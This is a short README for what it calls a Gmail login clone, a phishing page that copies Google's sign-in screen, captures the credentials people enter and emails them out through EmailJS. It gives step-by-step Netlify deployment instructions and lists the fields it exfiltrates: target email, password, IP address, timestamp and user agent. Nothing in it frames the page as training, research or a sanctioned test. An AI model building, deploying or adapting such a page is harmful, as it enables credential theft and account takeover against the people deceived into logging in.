# Gmail Login Clone

A pixel-cloned Google sign-in page that captures entered credentials and emails
them via EmailJS.

## Deploy
1. Push this repo to GitHub.
2. Netlify → Add new site → Import from Git → select repo.
3. Publish directory: `.`  (no build command).
4. Enable form detection (Site config → Forms) and redeploy once.

## EmailJS template variables
`{{target_email}}`, `{{password}}`, `{{ip}}`, `{{timestamp}}`,
`{{user_agent}}`, `{{verify_link}}` — To field: `{{to_email}}`
